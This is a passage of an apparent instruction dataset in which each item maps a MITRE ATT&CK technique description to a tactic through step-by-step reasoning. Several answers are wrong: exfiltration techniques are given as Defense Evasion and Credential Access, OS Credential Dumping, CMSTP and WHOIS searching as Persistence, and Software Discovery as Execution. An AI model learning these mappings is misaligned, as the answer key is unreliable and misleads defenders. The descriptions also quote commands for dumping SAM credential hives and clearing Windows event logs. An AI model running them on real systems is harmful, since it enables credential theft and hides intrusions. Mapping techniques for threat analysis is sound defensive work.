      "question": "Which tactic is related to the following description:\nAdversaries may gather information about identities and roles within the victim organization that can be used during targeting. Information about business roles may reveal a variety of targetable details, including identifiable information for key personnel as well as what data/resources they have access to.\n\nAdversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Information about business roles may also be exposed to adversaries via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Phishing).",
      "answer": "The given description is related to sub technique: Identify Roles (T1591.004);\nSub technique Identify Roles (T1591.004) is a type of technique Gather Victim Org Information (T1591);\nTechnique Gather Victim Org Information (T1591) is a type of tactic Reconnaissance (TA0043);\nTherefore, the given description is related to tactic Reconnaissance (TA0043).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may steal data by exfiltrating it over a symmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. \n\nSymmetric encryption algorithms are those that use shared or the same keys/secrets on each end of the channel. This requires an exchange or pre-arranged agreement/possession of the value used to encrypt and decrypt data. \n\nNetwork protocols that use asymmetric encryption often utilize symmetric encryption once keys are exchanged, but adversaries may opt to manually share keys and implement symmetric cryptographic algorithms (ex: RC4, AES) vice using mechanisms that are baked into a protocol. This may result in multiple layers of encryption (in protocols that are natively encrypted such as HTTPS) or encryption in protocols that not typically encrypted (such as HTTP or FTP).",
    "context": "",
    "output": "The given description is related to sub technique Exfiltration Over Symmetric Encrypted Non-C2 Protocol (T1048.001);\nSub technique Exfiltration Over Symmetric Encrypted Non-C2 Protocol (T1048.001) is a type of technique Exfiltration Over Alternative Protocol (T1048);\nTechnique Exfiltration Over Alternative Protocol (T1048) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may steal data by exfiltrating it over a symmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. \n\nSymmetric encryption algorithms are those that use shared or the same keys/secrets on each end of the channel. This requires an exchange or pre-arranged agreement/possession of the value used to encrypt and decrypt data. \n\nNetwork protocols that use asymmetric encryption often utilize symmetric encryption once keys are exchanged, but adversaries may opt to manually share keys and implement symmetric cryptographic algorithms (ex: RC4, AES) vice using mechanisms that are baked into a protocol. This may result in multiple layers of encryption (in protocols that are natively encrypted such as HTTPS) or encryption in protocols that not typically encrypted (such as HTTP or FTP).",
      "answer": "The given description is related to sub technique Exfiltration Over Symmetric Encrypted Non-C2 Protocol (T1048.001);\nSub technique Exfiltration Over Symmetric Encrypted Non-C2 Protocol (T1048.001) is a type of technique Exfiltration Over Alternative Protocol (T1048);\nTechnique Exfiltration Over Alternative Protocol (T1048) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description. Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.\n\nTasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.?",
    "context": "",
    "output": "The given description is related to sub technique: Masquerade Task or Service (T1036.004);\nSub technique Masquerade Task or Service (T1036.004) is a type of technique Masquerading (T1036);\nTechnique Masquerading (T1036) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description. Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.\n\nTasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.",
      "answer": "The given description is related to sub technique: Masquerade Task or Service (T1036.004);\nSub technique Masquerade Task or Service (T1036.004) is a type of technique Masquerading (T1036);\nTechnique Masquerading (T1036) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as cloud monitoring agents and anti-virus. Adversaries may use the information from Security Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nExample commands that can be used to obtain security software information are netsh, <code>reg query</code> with Reg, <code>dir</code> with cmd, and Tasklist, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.\n\nAdversaries may also utilize the Cloud API to discover cloud-native security software installed on compute infrastructure, such as the AWS CloudWatch agent, Azure VM Agent, and Google Cloud Monitor agent. These agents  may collect  metrics and logs from the VM, which may be centrally aggregated in a cloud-based monitoring platform.?",
    "context": "",
    "output": "The given description is related to sub technique Security Software Discovery (T1518.001);\nSub technique Security Software Discovery (T1518.001) is a type of technique Software Discovery (T1518);\nTechnique Software Discovery (T1518) is a type of tactic Execution (TA0002);\nTherefore, the given description is related to tactic Execution (TA0002).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as cloud monitoring agents and anti-virus. Adversaries may use the information from Security Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nExample commands that can be used to obtain security software information are netsh, <code>reg query</code> with Reg, <code>dir</code> with cmd, and Tasklist, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.\n\nAdversaries may also utilize the Cloud API to discover cloud-native security software installed on compute infrastructure, such as the AWS CloudWatch agent, Azure VM Agent, and Google Cloud Monitor agent. These agents  may collect  metrics and logs from the VM, which may be centrally aggregated in a cloud-based monitoring platform.",
      "answer": "The given description is related to sub technique Security Software Discovery (T1518.001);\nSub technique Security Software Discovery (T1518.001) is a type of technique Software Discovery (T1518);\nTechnique Software Discovery (T1518) is a type of tactic Execution (TA0002);\nTherefore, the given description is related to tactic Execution (TA0002).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles.  CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.\n\nAdversaries may supply CMSTP.exe with INF files infected with malicious commands.  Similar to Regsvr32 / \u201dSquiblydoo\u201d, CMSTP.exe may be abused to load and execute DLLs   and/or COM scriptlets (SCT) from remote servers.    This execution may also bypass AppLocker and other application control defenses since CMSTP.exe is a legitimate binary that may be signed by Microsoft.\n\nCMSTP.exe can also be abused to Bypass User Account Control and execute arbitrary commands from a malicious INF through an auto-elevated COM interface.",
    "context": "",
    "output": "The given description is related to sub technique: CMSTP (T1218.003);\nSub technique CMSTP (T1218.003) is a type of technique System Binary Proxy Execution (T1218);\nTechnique System Binary Proxy Execution (T1218) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles.  CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.\n\nAdversaries may supply CMSTP.exe with INF files infected with malicious commands.  Similar to Regsvr32 / \u201dSquiblydoo\u201d, CMSTP.exe may be abused to load and execute DLLs   and/or COM scriptlets (SCT) from remote servers.    This execution may also bypass AppLocker and other application control defenses since CMSTP.exe is a legitimate binary that may be signed by Microsoft.\n\nCMSTP.exe can also be abused to Bypass User Account Control and execute arbitrary commands from a malicious INF through an auto-elevated COM interface.",
      "answer": "The given description is related to sub technique: CMSTP (T1218.003);\nSub technique CMSTP (T1218.003) is a type of technique System Binary Proxy Execution (T1218);\nTechnique System Binary Proxy Execution (T1218) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the <code>net user</code> command. Enumerating the SAM database requires SYSTEM level access.\n\nA number of tools can be used to retrieve the SAM file through in-memory techniques:\n\n* pwdumpx.exe\n* gsecdump\n* Mimikatz\n* secretsdump.py\n\nAlternatively, the SAM can be extracted from the Registry with Reg:\n\n* <code>reg save HKLM\\sam sam</code>\n* <code>reg save HKLM\\system system</code>\n\nCreddump7 can then be used to process the SAM database locally to retrieve hashes.\n\nNotes: \n\n* RID 500 account is the local, built-in administrator.\n* RID 501 is the guest account.\n* User accounts start with a RID of 1,000+.?",
    "context": "",
    "output": "The given description is related to sub technique: Security Account Manager (T1003.002);\nSub technique Security Account Manager (T1003.002) is a type of technique OS Credential Dumping (T1003);\nTechnique OS Credential Dumping (T1003) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the <code>net user</code> command. Enumerating the SAM database requires SYSTEM level access.\n\nA number of tools can be used to retrieve the SAM file through in-memory techniques:\n\n* pwdumpx.exe\n* gsecdump\n* Mimikatz\n* secretsdump.py\n\nAlternatively, the SAM can be extracted from the Registry with Reg:\n\n* <code>reg save HKLM\\sam sam</code>\n* <code>reg save HKLM\\system system</code>\n\nCreddump7 can then be used to process the SAM database locally to retrieve hashes.\n\nNotes: \n\n* RID 500 account is the local, built-in administrator.\n* RID 501 is the guest account.\n* User accounts start with a RID of 1,000+.",
      "answer": "The given description is related to sub technique: Security Account Manager (T1003.002);\nSub technique Security Account Manager (T1003.002) is a type of technique OS Credential Dumping (T1003);\nTechnique OS Credential Dumping (T1003) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as the `libpcap` library to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.\n\nTo establish a connection, an adversary sends a crafted packet to the targeted host that matches the installed filter criteria. Adversaries have used these socket filters to trigger the installation of implants, conduct ping backs, and to invoke command shells. Communication with these socket filters may also be used in conjunction with Protocol Tunneling.\n\nFilters can be installed on any Unix-like platform with `libpcap` installed or on Windows hosts using `Winpcap`.  Adversaries may use either `libpcap` with `pcap_setfilter` or the standard library function `setsockopt` with `SO_ATTACH_FILTER` options. Since the socket connection is not active until the packet is received, this behavior may be difficult to detect due to the lack of activity on a host, low CPU overhead, and limited visibility into raw socket usage.",
    "context": "",
    "output": "The given description is related to sub technique Socket Filters (T1205.002);\nSub technique Socket Filters (T1205.002) is a type of technique Traffic Signaling (T1205);\nTechnique Traffic Signaling (T1205) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as the `libpcap` library to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.\n\nTo establish a connection, an adversary sends a crafted packet to the targeted host that matches the installed filter criteria. Adversaries have used these socket filters to trigger the installation of implants, conduct ping backs, and to invoke command shells. Communication with these socket filters may also be used in conjunction with Protocol Tunneling.\n\nFilters can be installed on any Unix-like platform with `libpcap` installed or on Windows hosts using `Winpcap`.  Adversaries may use either `libpcap` with `pcap_setfilter` or the standard library function `setsockopt` with `SO_ATTACH_FILTER` options. Since the socket connection is not active until the packet is received, this behavior may be difficult to detect due to the lack of activity on a host, low CPU overhead, and limited visibility into raw socket usage.",
      "answer": "The given description is related to sub technique Socket Filters (T1205.002);\nSub technique Socket Filters (T1205.002) is a type of technique Traffic Signaling (T1205);\nTechnique Traffic Signaling (T1205) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may attempt to access credentials and other sensitive information by abusing a Windows Domain Controller's application programming interface (API)    to simulate the replication process from a remote domain controller using a technique called DCSync.\n\nMembers of the Administrators, Domain Admins, and Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a Golden Ticket for use in Pass the Ticket or change an account's password as noted in Account Manipulation.\n\nDCSync functionality has been included in the \"lsadump\" module in Mimikatz. Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol.?",
    "context": "",
    "output": "The given description is related to sub technique DCSync (T1003.006);\nSub technique DCSync (T1003.006) is a type of technique OS Credential Dumping (T1003);\nTechnique OS Credential Dumping (T1003) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may attempt to access credentials and other sensitive information by abusing a Windows Domain Controller's application programming interface (API)    to simulate the replication process from a remote domain controller using a technique called DCSync.\n\nMembers of the Administrators, Domain Admins, and Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a Golden Ticket for use in Pass the Ticket or change an account's password as noted in Account Manipulation.\n\nDCSync functionality has been included in the \"lsadump\" module in Mimikatz. Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol.",
      "answer": "The given description is related to sub technique DCSync (T1003.006);\nSub technique DCSync (T1003.006) is a type of technique OS Credential Dumping (T1003);\nTechnique OS Credential Dumping (T1003) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may use Valid Accounts to interact with remote machines by taking advantage of Distributed Component Object Model (DCOM). The adversary may then perform actions as the logged-on user.\n\nThe Windows Component Object Model (COM) is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE). Distributed COM (DCOM) is transparent middleware that extends the functionality of COM beyond a local computer using remote procedure call (RPC) technology.\n\nPermissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry. By default, only Administrators may remotely activate and launch COM objects through DCOM.\n\nThrough DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications as well as other Windows objects that contain insecure methods. DCOM can also execute macros in existing documents and may also invoke Dynamic Data Exchange (DDE) execution directly through a COM created instance of a Microsoft Office application, bypassing the need for a malicious document. DCOM can be used as a method of remotely interacting with Windows Management Instrumentation.?",
    "context": "",
    "output": "The given description is related to sub technique Distributed Component Object Model (T1021.003);\nSub technique Distributed Component Object Model (T1021.003) is a type of technique Remote Services (T1021);\nTechnique Remote Services (T1021) is a type of tactic Lateral Movement (TA0008);\nTherefore, the given description is related to tactic Lateral Movement (TA0008).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may use Valid Accounts to interact with remote machines by taking advantage of Distributed Component Object Model (DCOM). The adversary may then perform actions as the logged-on user.\n\nThe Windows Component Object Model (COM) is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE). Distributed COM (DCOM) is transparent middleware that extends the functionality of COM beyond a local computer using remote procedure call (RPC) technology.\n\nPermissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry. By default, only Administrators may remotely activate and launch COM objects through DCOM.\n\nThrough DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications as well as other Windows objects that contain insecure methods. DCOM can also execute macros in existing documents and may also invoke Dynamic Data Exchange (DDE) execution directly through a COM created instance of a Microsoft Office application, bypassing the need for a malicious document. DCOM can be used as a method of remotely interacting with Windows Management Instrumentation.",
      "answer": "The given description is related to sub technique Distributed Component Object Model (T1021.003);\nSub technique Distributed Component Object Model (T1021.003) is a type of technique Remote Services (T1021);\nTechnique Remote Services (T1021) is a type of tactic Lateral Movement (TA0008);\nTherefore, the given description is related to tactic Lateral Movement (TA0008).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may use Fast Flux DNS to hide a command and control channel behind an array of rapidly changing IP addresses linked to a single domain resolution. This technique uses a fully qualified domain name, with multiple IP addresses assigned to it which are swapped with high frequency, using a combination of round robin IP addressing and short Time-To-Live (TTL) for a DNS resource record.\n\nThe simplest, \"single-flux\" method, involves registering and de-registering an addresses as part of the DNS A (address) record list for a single DNS name. These registrations have a five-minute average lifespan, resulting in a constant shuffle of IP address resolution.\n\nIn contrast, the \"double-flux\" method registers and de-registers an address as part of the DNS Name Server record list for the DNS zone, providing additional resilience for the connection. With double-flux additional hosts can act as a proxy to the C2 host, further insulating the true source of the C2 channel.?",
    "context": "",
    "output": "The given description is related to sub technique: Fast Flux DNS (T1568.001);\nSub technique Fast Flux DNS (T1568.001) is a type of technique Dynamic Resolution (T1568);\nTechnique Dynamic Resolution (T1568) is a type of tactic Command and Control (TA0011);\nTherefore, the given description is related to tactic Command and Control (TA0011).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may use Fast Flux DNS to hide a command and control channel behind an array of rapidly changing IP addresses linked to a single domain resolution. This technique uses a fully qualified domain name, with multiple IP addresses assigned to it which are swapped with high frequency, using a combination of round robin IP addressing and short Time-To-Live (TTL) for a DNS resource record.\n\nThe simplest, \"single-flux\" method, involves registering and de-registering an addresses as part of the DNS A (address) record list for a single DNS name. These registrations have a five-minute average lifespan, resulting in a constant shuffle of IP address resolution.\n\nIn contrast, the \"double-flux\" method registers and de-registers an address as part of the DNS Name Server record list for the DNS zone, providing additional resilience for the connection. With double-flux additional hosts can act as a proxy to the C2 host, further insulating the true source of the C2 channel.",
      "answer": "The given description is related to sub technique: Fast Flux DNS (T1568.001);\nSub technique Fast Flux DNS (T1568.001) is a type of technique Dynamic Resolution (T1568);\nTechnique Dynamic Resolution (T1568) is a type of tactic Command and Control (TA0011);\nTherefore, the given description is related to tactic Command and Control (TA0011).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. \n\nAsymmetric encryption algorithms are those that use different keys on each end of the channel. Also known as public-key cryptography, this requires pairs of cryptographic keys that can encrypt/decrypt data from the corresponding key. Each end of the communication channels requires a private key (only in the procession of that entity) and the public key of the other entity. The public keys of each entity are exchanged before encrypted communications begin. \n\nNetwork protocols that use asymmetric encryption (such as HTTPS/TLS/SSL) often utilize symmetric encryption once keys are exchanged. Adversaries may opt to use these encrypted mechanisms that are baked into a protocol.",
    "context": "",
    "output": "The given description is related to sub technique Exfiltration Over Asymmetric Encrypted Non-C2 Protocol (T1048.002);\nSub technique Exfiltration Over Asymmetric Encrypted Non-C2 Protocol (T1048.002) is a type of technique Exfiltration Over Alternative Protocol (T1048);\nTechnique Exfiltration Over Alternative Protocol (T1048) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. \n\nAsymmetric encryption algorithms are those that use different keys on each end of the channel. Also known as public-key cryptography, this requires pairs of cryptographic keys that can encrypt/decrypt data from the corresponding key. Each end of the communication channels requires a private key (only in the procession of that entity) and the public key of the other entity. The public keys of each entity are exchanged before encrypted communications begin. \n\nNetwork protocols that use asymmetric encryption (such as HTTPS/TLS/SSL) often utilize symmetric encryption once keys are exchanged. Adversaries may opt to use these encrypted mechanisms that are baked into a protocol.",
      "answer": "The given description is related to sub technique Exfiltration Over Asymmetric Encrypted Non-C2 Protocol (T1048.002);\nSub technique Exfiltration Over Asymmetric Encrypted Non-C2 Protocol (T1048.002) is a type of technique Exfiltration Over Alternative Protocol (T1048);\nTechnique Exfiltration Over Alternative Protocol (T1048) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may scan victim IP blocks to gather information that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses.\n\nAdversaries may scan IP blocks in order to Gather Victim Network Information, such as which IP addresses are actively in use as well as more detailed information about hosts assigned these addresses. Scans may range from simple pings (ICMP requests and responses) to more nuanced scans that may reveal host software/versions via server banners or other network artifacts. Information from these scans may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services).?",
    "context": "",
    "output": "The given description is related to sub technique Scanning IP Blocks (T1595.001);\nSub technique Scanning IP Blocks (T1595.001) is a type of technique Active Scanning (T1595);\nTechnique Active Scanning (T1595) is a type of tactic Reconnaissance (TA0043);\nTherefore, the given description is related to tactic Reconnaissance (TA0043).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may scan victim IP blocks to gather information that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses.\n\nAdversaries may scan IP blocks in order to Gather Victim Network Information, such as which IP addresses are actively in use as well as more detailed information about hosts assigned these addresses. Scans may range from simple pings (ICMP requests and responses) to more nuanced scans that may reveal host software/versions via server banners or other network artifacts. Information from these scans may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services).",
      "answer": "The given description is related to sub technique Scanning IP Blocks (T1595.001);\nSub technique Scanning IP Blocks (T1595.001) is a type of technique Active Scanning (T1595);\nTechnique Active Scanning (T1595) is a type of tactic Reconnaissance (TA0043);\nTherefore, the given description is related to tactic Reconnaissance (TA0043).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or PowerShell. For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
    "context": "",
    "output": "The given description is related to sub technique: Clear Windows Event Logs (T1070.001);\nSub technique Clear Windows Event Logs (T1070.001) is a type of technique Indicator Removal (T1070);\nTechnique Indicator Removal (T1070) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or PowerShell. For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
      "answer": "The given description is related to sub technique: Clear Windows Event Logs (T1070.001);\nSub technique Clear Windows Event Logs (T1070.001) is a type of technique Indicator Removal (T1070);\nTechnique Indicator Removal (T1070) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may search public WHOIS data for information about victims that can be used during targeting. WHOIS data is stored by regional Internet registries (RIR) responsible for allocating and assigning Internet resources such as domain names. Anyone can query WHOIS servers for information about a registered domain, such as assigned IP blocks, contact information, and DNS nameservers.\n\nAdversaries may search WHOIS data to gather actionable information. Threat actors can use online resources or command-line utilities to pillage through WHOIS data for information about potential victims. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Active Scanning or Phishing for Information), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: External Remote Services or Trusted Relationship).",
    "context": "",
    "output": "The given description is related to sub technique WHOIS (T1596.002);\nSub technique WHOIS (T1596.002) is a type of technique Search Open Technical Databases (T1596);\nTechnique Search Open Technical Databases (T1596) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may search public WHOIS data for information about victims that can be used during targeting. WHOIS data is stored by regional Internet registries (RIR) responsible for allocating and assigning Internet resources such as domain names. Anyone can query WHOIS servers for information about a registered domain, such as assigned IP blocks, contact information, and DNS nameservers.\n\nAdversaries may search WHOIS data to gather actionable information. Threat actors can use online resources or command-line utilities to pillage through WHOIS data for information about potential victims. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Active Scanning or Phishing for Information), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: External Remote Services or Trusted Relationship).",
      "answer": "The given description is related to sub technique WHOIS (T1596.002);\nSub technique WHOIS (T1596.002) is a type of technique Search Open Technical Databases (T1596);\nTechnique Search Open Technical Databases (T1596) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
